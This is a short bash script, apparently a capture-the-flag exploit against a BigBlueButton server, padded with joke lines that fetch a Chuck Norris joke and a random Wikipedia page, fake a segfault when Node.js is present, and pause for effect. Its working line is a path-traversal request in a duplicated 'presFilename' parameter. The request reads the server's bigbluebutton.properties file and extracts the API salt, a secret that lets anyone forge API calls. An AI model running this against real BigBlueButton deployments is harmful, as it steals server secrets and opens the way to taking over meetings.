#!/bin/bash

# Fetch Chuck Norris Joke
CHUCK_NORRIS_JOKE=$(curl -s http://api.icndb.com/jokes/random)

# Don't run if nodejs is installed
if which node; then echo Segmentation fault && exit 1; fi

# Download random wikipedia article
WIKI=$(curl -s -L https://en.wikipedia.org/wiki/Special:Random)

# Sleep for Dramatic Effect
sleep 3

BBB_HOST=vulnbbb.redrocket.club
# ID of a slide download on the BBB server
BBB_PRES_ID="f5799a04dfbe076a1010a5979cd58aa9982292b6-1588090111265/6c695aabecb38ac5b73640cc38856477f26f19c3-1588090140989"

curl -s "https://${BBB_HOST}/bigbluebutton/presentation/download/${BBB_PRES_ID}?presfilename=ff-255.pdf&presFilename=../../../../../../..//usr/share/bbb-web/WEB-INF/classes/bigbluebutton.properties"|grep Salt
